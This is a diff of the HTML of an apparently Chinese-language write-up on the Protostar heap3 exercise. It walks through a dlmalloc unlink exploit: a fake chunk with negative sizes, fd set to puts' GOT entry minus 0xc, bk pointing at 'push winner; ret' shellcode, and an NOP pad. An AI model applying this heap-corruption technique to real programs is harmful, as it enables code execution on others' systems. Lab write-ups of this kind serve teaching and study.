-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b118 R_386_JUMP_SLOT   strcpy
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b11c R_386_JUMP_SLOT   &lt;span class=&#34;nb&#34;&gt;printf&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b120 R_386_JUMP_SLOT   fprintf
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b124 R_386_JUMP_SLOT   &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b128 R_386_JUMP_SLOT   puts
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b12c R_386_JUMP_SLOT   munmap
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;0x0804b128 - 0xc = 0x0804b11c
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以及 &lt;code&gt;winner()&lt;/code&gt; 的地址：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;user@protostar:/tmp/heap$ objdump -t /opt/protostar/bin/heap3 | grep winner
-08048864 g     F .text	00000025              winner
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;把它做成 shellcode，使用&lt;a class=&#34;link&#34; href=&#34;http://shell-storm.org/online/Online-Assembler-and-Disassembler/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;这个工具&lt;/a&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# x86 (32)
-push 0x08048864
-ret
-
-# Assembly - Little Endian
-&amp;#34;\x68\x64\x88\x04\x08\xc3&amp;#34;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;啊..但是差点忘了一件事情，就是我们还没弄出一个 &lt;code&gt;P-&amp;gt;bk&lt;/code&gt; = &lt;code&gt;addr of shellcode&lt;/code&gt; 且 &lt;code&gt;P-&amp;gt;fd&lt;/code&gt; = &lt;code&gt;addr of puts() - 0xc&lt;/code&gt; 的 chunk 呢&amp;hellip;&lt;/p&gt;
+&lt;p&gt;至此，我们成功伪造了 chunkB 的 prevchunk，&lt;/p&gt;
+&lt;p&gt;而这个 prevchunk 的 fd 的位置是 &lt;code&gt;p - prev_size + 0x8&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;也就是 &lt;em&gt;p&lt;/em&gt; 向后偏移 0x10 的位置&lt;/p&gt;
+&lt;p&gt;而 bk 的话再偏移 0x4 也就是 &lt;em&gt;p + 0x14&lt;/em&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;create-a-fake-chunk&#34;&gt;Create a fake chunk&lt;/h2&gt;
-&lt;p&gt;首先 &lt;code&gt;strcpy()&lt;/code&gt; 不会检查字符数量，所以可以在堆上写多于 &lt;code&gt;malloc(32)&lt;/code&gt; 的字符&lt;/p&gt;
-&lt;p&gt;我们现在要创建一个这样的 chunk：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    chunk -&amp;gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-             | prev_size: no idea                                      |
-             +---------------------------------------------------------+
-             | size: no idea                                           |
-      mem -&amp;gt; +---------------------------------------------------------+
-             | fd: addr of puts() minus 0x12                           |
-             +---------------------------------------------------------+
-             | bk: addr of shellcode                                   |
-             +---------------------------------------------------------+
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而且我们必须要让 &lt;code&gt;unlink()&lt;/code&gt; 这个函数被执行&amp;hellip;这就出现了两个先决条件：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;前一个 chunk 也得是被 free 了的&lt;/li&gt;
-&lt;li&gt;这个 chunk 和 前一个 chunk 的 &lt;code&gt;size&lt;/code&gt; 都得大于 80 bytes 不然就会使用 &lt;code&gt;fastbin&lt;/code&gt; 而不是双向链表&lt;/li&gt;
-&lt;/ol&gt;
-&lt;br&gt;
-&lt;p&gt;还记得 malloc 标记前一个 chunk 是否被 free 的方法是：看 &lt;code&gt;size&lt;/code&gt; 的最后一个比特是否被设为零，设为零即「前一个 chunk 已被 free」&lt;/p&gt;
-&lt;p&gt;所以我们需要伪造一个 chunk size&amp;hellip;需要大于 80 bytes 而且最后一个比特为零&amp;hellip;&lt;/p&gt;
-&lt;p&gt;这里有一个很聪明的做法&amp;hellip;可以用负数，比如 &lt;code&gt;0xfffffffc&lt;/code&gt; 即 &lt;code&gt;-4&lt;/code&gt;&lt;/p&gt;
-&lt;br&gt;
-&lt;p&gt;而且这个 &lt;code&gt;0xfffffffc = -4&lt;/code&gt; 能导致两个很有趣的特性：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;不含 null byte&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;malloc 计算下一个 chunk 的位置的方式是：&lt;code&gt;P + size&lt;/code&gt;&lt;br&gt;
-那么 &lt;code&gt;P + (-4)&lt;/code&gt; = &lt;code&gt;P - 4&lt;/code&gt;，就是说下一个 chunk 出现在了当前 chunk 的向前 4 bytes&amp;hellip;&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;&lt;code&gt;prev_size&lt;/code&gt; 同理&amp;hellip;姑且为了区分就设为 &lt;code&gt;0xfffffff8&lt;/code&gt; 也就是 &lt;code&gt;-8&lt;/code&gt; ，那么上一个 chunk 出现在了当前 chunk 的向后 8 bytes&lt;/p&gt;
-&lt;p&gt;结果就是，我们不需要浪费堆上很多的地址，只要在很小的一段空间里就能伪造出 BK 和 FD&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/fakechunk.png&#34;
-	width=&#34;1522&#34;
-	height=&#34;992&#34;
-	srcset=&#34;/p/protostar_heap_3/fakechunk_hu6ac2e7c3e3bc9a548d253792e3254835_229910_480x0_resize_box_3.png 480w, /p/protostar_heap_3/fakechunk_hu6ac2e7c3e3bc9a548d253792e3254835_229910_1024x0_resize_box_3.png 1024w&#34;
+&lt;p&gt;首先，我们所需要的地址有两个：&lt;strong&gt;&lt;code&gt;puts()&lt;/code&gt; 在 GOT 上的地址&lt;/strong&gt; 和 &lt;strong&gt;指向 &lt;code&gt;winner()&lt;/code&gt; shellcode 的地址&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@protostar:/tmp# objdump -R /opt/protostar/bin/heap3 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep puts
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b128 R_386_JUMP_SLOT   puts
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@protostar:/tmp# objdump -t /opt/protostar/bin/heap3 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep winner
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;08048864&lt;/span&gt; g     F .text	&lt;span class=&#34;m&#34;&gt;00000025&lt;/span&gt;              winner
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们可以把 &lt;code&gt;push 0x08048864 ret&lt;/code&gt; 写在 chunkA 的开头，那么地址就是（这里我当然是用了 gdb proc map 看堆到底在哪里的）就是 &lt;code&gt;0x804c008&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;那么使用前面的公式：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;令 &lt;span class=&#34;nv&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; addr of func - 0xc
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;令 &lt;span class=&#34;nv&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; addr of shllcode
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;那么
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;我们所想要的：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;fd + &lt;span class=&#34;nv&#34;&gt;0xc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; addr of shllcode
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;我们必须得纳入考虑并避免的：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bk + &lt;span class=&#34;nv&#34;&gt;0x8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; addr of func
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;换成这道题的地址：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;令 &lt;span class=&#34;nv&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; addr of func - &lt;span class=&#34;nv&#34;&gt;0xc&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; addr of puts - &lt;span class=&#34;nv&#34;&gt;0xc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 0x0804b11c
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;令 &lt;span class=&#34;nv&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; addr of &lt;span class=&#34;nv&#34;&gt;shllcode&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 0x804c008
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;那么
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;我们所想要的：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;fd + &lt;span class=&#34;nv&#34;&gt;0xc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; addr of shllcode
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;我们必须得纳入考虑并避免的：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bk + &lt;span class=&#34;nv&#34;&gt;0x8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; addr of puts
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;关于制作 shellcode，可以使用&lt;a class=&#34;link&#34; href=&#34;http://shell-storm.org/online/Online-Assembler-and-Disassembler/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;这个工具&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# x86 (32), Little Endian&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 0x08048864 is the address of winner&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;push 0x08048864
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ret
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Assembly - Little Endian&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x68\x64\x88\x04\x08\xc3&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后，直接可以画出这张图了：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/fakechunk_after.png&#34;
+	width=&#34;1662&#34;
+	height=&#34;930&#34;
+	srcset=&#34;/p/protostar_heap_3/fakechunk_after_hu7bd00f0ddcd30b9862bab328e88dbb8f_263828_480x0_resize_box_3.png 480w, /p/protostar_heap_3/fakechunk_after_hu7bd00f0ddcd30b9862bab328e88dbb8f_263828_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
-		alt=&#34;fakechunk&#34;
+		alt=&#34;fakechunk_after.png&#34;
 	
 	
 		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;153&#34;
-		data-flex-basis=&#34;368px&#34;
+		data-flex-grow=&#34;178&#34;
+		data-flex-basis=&#34;428px&#34;
 	
 &gt;&lt;/p&gt;
+&lt;hr&gt;
 &lt;h2 id=&#34;free-a-fastbin&#34;&gt;Free a fastbin&lt;/h2&gt;
 &lt;p&gt;其实已经基本解完了&amp;hellip;但其实还有最后一个小问题&lt;/p&gt;
 &lt;p&gt;我们先用上一节的那张图片的思路来试一下吧（第三个参数完全不需要，所以随便写一个 ABCD 就行）&lt;/p&gt;
@@ -1581,7 +1299,8 @@ ret
 &lt;br&gt;
 &lt;p&gt;另外，&lt;code&gt;0x804c010&lt;/code&gt; 也被写上了奇怪的东西&amp;hellip;也就是&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;而且在第四步还出现了 &lt;code&gt;addr of shellcode+0x8 = addr of puts()&lt;/code&gt;，也就是说这个 shellcode + &lt;code&gt;0x8&lt;/code&gt; 的位置会被 &lt;code&gt;unlink()&lt;/code&gt; 写上 &lt;code&gt;addr of puts()&lt;/code&gt;&amp;hellip;&lt;/p&gt;
+&lt;p&gt;我们必须得纳入考虑并避免的：
+bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;这时候就又要请出 NOP 了&amp;hellip;我们直接把 &lt;code&gt;0x804c008&lt;/code&gt; 到 &lt;code&gt;0x804c010&lt;/code&gt; 全写上 NOP 就好了&amp;hellip;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/nop.png&#34;
@@ -1598,19 +1317,32 @@ ret
 		data-flex-basis=&#34;1142px&#34;
 	
 &gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;实际上，我觉得我这里做的有点点问题&lt;/p&gt;
+&lt;p&gt;毕竟，虽然写上了 NOP，但 0x804c010 处的 addr of puts 的地址也确实会被当作一些指令&lt;/p&gt;
+&lt;p&gt;这次运气倒是比较好，因为这个指令翻译过去的话是：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# x86 (32), Little Endian&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1cb10408
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Disassembly&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x0000000000000000:  1C B1    sbb al, 0xb1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x0000000000000002:  &lt;span class=&#34;m&#34;&gt;04&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;08&lt;/span&gt;    add al, &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;看起来还算正常，并不会导致 Segmentation Fault&lt;/p&gt;
+&lt;p&gt;但下次果然还是应该多考虑一下&lt;/p&gt;
+&lt;/blockquote&gt;
 &lt;p&gt;那么重新画一下图，就是这样：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/true.png&#34;
-	width=&#34;1522&#34;
-	height=&#34;992&#34;
-	srcset=&#34;/p/protostar_heap_3/true_hu6ac2e7c3e3bc9a548d253792e3254835_230261_480x0_resize_box_3.png 480w, /p/protostar_heap_3/true_hu6ac2e7c3e3bc9a548d253792e3254835_230261_1024x0_resize_box_3.png 1024w&#34;
+	width=&#34;1662&#34;
+	height=&#34;930&#34;
+	srcset=&#34;/p/protostar_heap_3/true_hu7bd00f0ddcd30b9862bab328e88dbb8f_264219_480x0_resize_box_3.png 480w, /p/protostar_heap_3/true_hu7bd00f0ddcd30b9862bab328e88dbb8f_264219_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;true&#34;
 	
 	
 		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;153&#34;
-		data-flex-basis=&#34;368px&#34;
+		data-flex-grow=&#34;178&#34;
+		data-flex-basis=&#34;428px&#34;
 	
 &gt;&lt;/p&gt;
 &lt;hr&gt;
@@ -1645,14 +1377,13 @@ ret
 &lt;!DOCTYPE html&gt;
 &lt;html&gt;
 &lt;head&gt;
-&lt;title&gt;Untitled Diagram-6-7-4&lt;/title&gt;
+&lt;title&gt;Untitled Diagram&lt;/title&gt;
 &lt;meta charset=&#34;utf-8&#34;/&gt;
 &lt;/head&gt;
-&lt;body&gt;&lt;div class=&#34;mxgraph&#34; style=&#34;max-width:100%;border:1px solid transparent;&#34; data-mxgraph=&#34;{&amp;quot;highlight&amp;quot;:&amp;quot;#0000ff&amp;quot;,&amp;quot;nav&amp;quot;:true,&amp;quot;resize&amp;quot;:true,&amp;quot;page&amp;quot;:0,&amp;quot;toolbar&amp;quot;:&amp;quot;pages zoom layers tags lightbox&amp;quot;,&amp;quot;edit&amp;quot;:&amp;quot;_blank&amp;quot;,&amp;quot;xml&amp;quot;:&amp;quot;&amp;lt;mxfile host=\&amp;quot;app.diagrams.net\&amp;quot; modified=\&amp;quot;2022-04-07T05:44:36.169Z\&amp;quot; agent=\&amp;quot;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15\&amp;quot; etag=\&amp;quot;3GpF4croqte_4CpXaax2\&amp;quot; version=\&amp;quot;17.4.0\&amp;quot; type=\&amp;quot;device\&amp;quot; pages=\&amp;quot;2\&amp;quot;&amp;gt;&amp;lt;diagram id=\&amp;quot;9m9pWsRvkve3vRoIh5zU\&amp;quot; name=\&amp;quot;Page-1\&amp;quot;&amp;gt;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&amp;lt;/diagram&amp;gt;&amp;lt;diagram id=\&amp;quot;Yspwrotni0tyzMKoO_N9\&amp;quot; name=\&amp;quot;Page-2\&amp;quot;&amp;gt;7Vxrc5s4FP01nt3ujD2AePljnCZ9bN9pm3a/dHgImwYjF4vY2V+/EgjzkLCxDcaebmaSgABZnKNz79WV5AG4nq9fRNZi9ha5MBgokrsegOcDRTGBRP7Sgqe0QJZ1Iy2ZRr7LyvKCO/9fyArZg9PYd+GydCNGKMD+olzooDCEDi6VWVGEVuXbPBSUP3VhTSFXcOdYAV9677t4lpaqMsjLX0J/OmOfrJnswtzK7mUvspxZLloVisDNAFxHCOH0aL6+hgHFLoMlfe625uqmXREMcZMHpPvJauL/cLzZw41if3y1vDfwEIzTah6tIGYvzFqLnzIESMMX9NCJo+BpElnOAyQfOFnNfAzvFpZDr60I+aRshucBOZPJYYTi0IUuO/MCf/EyO0YhZjzLBIWJ60eEOB+FpCBEEYVt4vlBcI0CFCVNAK4FTc8h5UscoQdYuKI7JrS9zZWMIlovDxDD7BFGGK4LRQywFxDNIY6eyC3sKtC19JGs9+oMnlXeFRSZ3TMrdgNGusV633RTdc4QOWAk7UGYpuwmLIde2s1TkQ2Vw1EWcKFB01VFXJiKDXS9HeRlVSohr2TnBeRlXeKRl6UWoB+//PzxTjL19+HqlTy+nr5DmjuUOeQXEXz8saTgKXpANWFH5GiKNxAcS